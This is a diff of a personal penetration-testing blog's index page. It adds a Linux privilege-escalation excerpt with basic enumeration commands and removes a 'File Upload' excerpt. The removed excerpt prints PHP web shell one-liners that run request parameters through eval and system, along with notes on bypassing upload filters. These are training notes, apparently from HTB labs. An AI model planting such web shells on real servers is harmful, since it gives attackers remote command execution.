@@ -137,6 +137,40 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2024/10/25/pentest/privesc/Linux Privilege Escalation/" >Linux Privilege Escalation</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-10-25  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p>Linux 系统上的 root 帐户提供对操作系统的完全管理级别访问权限。在评估期间，可能会在 Linux 主机上获得低权限 shell，并需要将权限提升到 root 帐户。</p>
+<h1 id="Environment-Enumeration"><a href="#Environment-Enumeration" class="headerlink" title="Environment Enumeration"></a>Environment Enumeration</h1><p>枚举是特权提升的关键。有多个辅助脚本（如<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a>和<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">LinEnum）</a>可用于协助枚举。</p>
+<h2 id="Operating-system-and-version"><a href="#Operating-system-and-version" class="headerlink" title="Operating system and version"></a>Operating system and version</h2><p><a target="_blank" rel="noopener" href="https://ubuntu.com/about/release-cycle">Ubuntu 维护周期</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/os-release</span><br><span class="line"></span><br><span class="line">NAME=&quot;Ubuntu&quot;</span><br><span class="line">VERSION=&quot;20.04.4 LTS (Focal Fossa)&quot;</span><br><span class="line">ID=ubuntu</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">PRETTY_NAME=&quot;Ubuntu 20.04.4 LTS&quot;</span><br><span class="line">VERSION_ID=&quot;20.04&quot;</span><br><span class="line">HOME_URL=&quot;https://www.ubuntu.com/&quot;</span><br><span class="line">SUPPORT_URL=&quot;https://help.ubuntu.com/&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;https://bugs.launchpad.net/ubuntu/&quot;</span><br><span class="line">PRIVACY_POLICY_URL=&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;</span><br><span class="line">VERSION_CODENAME=focal</span><br><span class="line">UBUNTU_CODENAME=focal</span><br></pre></td></tr></table></figure>
+
+<h2 id="PATH"><a href="#PATH" class="headerlink" title="PATH"></a>PATH</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo $PATH</span><br><span class="line"></span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br></pre></td></tr></table></figure>
+
+<h2 id="env"><a href="#env" class="headerlink" title="env"></a>env</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ env</span><br><span class="line"></span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PWD=/home/htb-student</span><br><span class="line">LOGNAME=htb-student</span><br><span class="line">XDG_SESSION_TYPE=tty</span><br><span class="line">MOTD_SHOWN=pam</span><br><span class="line">HOME=/home/htb-student</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
+	
+	</div>
+  <a type="button" href="/2024/10/25/pentest/privesc/Linux Privilege Escalation/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2024/10/16/pentest/web-pentest/Command Injections/" >Command Injections</a>
 		</h3>
 		</div>
@@ -288,40 +322,6 @@
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/10/14/pentest/web-pentest/File Upload/" >File Upload</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-10-14  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="Web-Shell"><a href="#Web-Shell" class="headerlink" title="Web Shell"></a>Web Shell</h1><p>Php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;  </span><br><span class="line">&lt;?php system($_REQUEST[&#x27;cmd&#x27;]); ?&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;?=eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;  </span><br><span class="line">&lt;?=$_GET[0]($_REQUEST[1]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<h1 id="Bypassing-Filters"><a href="#Bypassing-Filters" class="headerlink" title="Bypassing Filters"></a>Bypassing Filters</h1><h2 id="前端过滤器"><a href="#前端过滤器" class="headerlink" title="前端过滤器"></a>前端过滤器</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uploadFile&quot;</span> <span class="attr">id</span>=<span class="string">&quot;uploadFile&quot;</span> <span class="attr">onchange</span>=<span class="string">&quot;checkFile(this)&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;.jpg,.jpeg,.png&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">File</span>) </span>&#123;  </span><br><span class="line">...SNIP...  </span><br><span class="line">    <span class="keyword">if</span> (extension !== <span class="string">&#x27;jpg&#x27;</span> &amp;&amp; extension !== <span class="string">&#x27;jpeg&#x27;</span> &amp;&amp; extension !== <span class="string">&#x27;png&#x27;</span>) &#123;  </span><br><span class="line">        $(<span class="string">&#x27;#error_message&#x27;</span>).<span class="title function_ invoke__">text</span>(<span class="string">&quot;Only images are allowed!&quot;</span>);  </span><br><span class="line">        File.form.<span class="title function_ invoke__">reset</span>();  </span><br><span class="line">        $(<span class="string">&quot;#submit&quot;</span>).<span class="title function_ invoke__">attr</span>(<span class="string">&quot;disabled&quot;</span>, <span class="literal">true</span>);  </span><br><span class="line">    ...SNIP...  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="后端过滤器"><a href="#后端过滤器" class="headerlink" title="后端过滤器"></a>后端过滤器</h2><h3 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h3><p>SecLists <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-extensions.txt">web-extensions</a></p>
-	
-	</div>
-  <a type="button" href="/2024/10/14/pentest/web-pentest/File Upload/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -377,7 +377,7 @@
 		
 			<li><a href="/categories/Others/">Others<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>16</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>17</span></a></li>
 		
 			<li><a href="/categories/Php/">Php<span>2</span></a></li>
 		
@@ -398,45 +398,45 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/Enumeration/">Enumeration<span>4</span></a></li>
-		
-			<li><a href="/tags/Web-Pentest/">Web-Pentest<span>9</span></a></li>
-		
-			<li><a href="/tags/General/">General<span>1</span></a></li>
-		
-			<li><a href="/tags/Service-Test/">Service-Test<span>1</span></a></li>
-		
 			<li><a href="/tags/Fastjson/">Fastjson<span>1</span></a></li>
-		
-			<li><a href="/tags/Crack/">Crack<span>2</span></a></li>
-		
-			<li><a href="/tags/Hash/">Hash<span>1</span></a></li>
-		
-			<li><a href="/tags/CommonsCollections/">CommonsCollections<span>5</span></a></li>
-		
-			<li><a href="/tags/Http/">Http<span>1</span></a></li>
-		
-			<li><a href="/tags/Tunnel/">Tunnel<span>1</span></a></li>
-		
-			<li><a href="/tags/Lateral-Movement/">Lateral-Movement<span>3</span></a></li>
-		
-			<li><a href="/tags/Privesc/">Privesc<span>3</span></a></li>
-		
-			<li><a href="/tags/Payload/">Payload<span>1</span></a></li>
-		
-			<li><a href="/tags/HTB/">HTB<span>10</span></a></li>
 		
 			<li><a href="/tags/Base/">Base<span>5</span></a></li>
 		
 			<li><a href="/tags/Shiro/">Shiro<span>1</span></a></li>
 		
+			<li><a href="/tags/Deserialize/">Deserialize<span>7</span></a></li>
+		
+			<li><a href="/tags/Tunnel/">Tunnel<span>1</span></a></li>
+		
 			<li><a href="/tags/Ethernaut/">Ethernaut<span>1</span></a></li>
 		
-			<li><a href="/tags/Log4j2/">Log4j2<span>1</span></a></li>
+			<li><a href="/tags/Payload/">Payload<span>1</span></a></li>
+		
+			<li><a href="/tags/Http/">Http<span>1</span></a></li>
+		
+			<li><a href="/tags/Enumeration/">Enumeration<span>4</span></a></li>
 		
 			<li><a href="/tags/JNDI/">JNDI<span>1</span></a></li>
 		
-			<li><a href="/tags/Deserialize/">Deserialize<span>7</span></a></li>
+			<li><a href="/tags/HTB/">HTB<span>10</span></a></li>
+		
+			<li><a href="/tags/General/">General<span>1</span></a></li>
+		
+			<li><a href="/tags/Crack/">Crack<span>2</span></a></li>
+		
+			<li><a href="/tags/Lateral-Movement/">Lateral-Movement<span>3</span></a></li>
+		
+			<li><a href="/tags/RMI/">RMI<span>1</span></a></li>
+		
+			<li><a href="/tags/CommonsCollections/">CommonsCollections<span>5</span></a></li>
+		
+			<li><a href="/tags/CISCN/">CISCN<span>2</span></a></li>
+		
+			<li><a href="/tags/Hash/">Hash<span>1</span></a></li>
+		
+			<li><a href="/tags/Log4j2/">Log4j2<span>1</span></a></li>
+		
+			<li><a href="/tags/Privesc/">Privesc<span>3</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>23</span></a></li>
@@ -452,6 +452,10 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2025/12/31/pentest/full-pentest/" ><i class="fa fa-file-o"></i>Full-Pentest</a>
+      </li>
+    
+      <li>
         <a href="/2025/09/01/blockchain/Ethernaut/" ><i class="fa fa-file-o"></i>Ethernaut</a>
       </li>
     
@@ -465,10 +469,6 @@
     
       <li>
         <a href="/2024/10/25/pentest/privesc/Linux Privilege Escalation/" ><i class="fa fa-file-o"></i>Linux Privilege Escalation</a>
-      </li>
-    
-      <li>
-        <a href="/2024/10/16/pentest/web-pentest/Command Injections/" ><i class="fa fa-file-o"></i>Command Injections</a>
       </li>
     
   </ul>
@@ -498,7 +498,7 @@
   <div class="container-narrow">
   <footer> <p>
   
-  &copy; 2025 n2ryx's Blog
+  &copy; 2026 n2ryx's Blog
   
       powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
 </p>
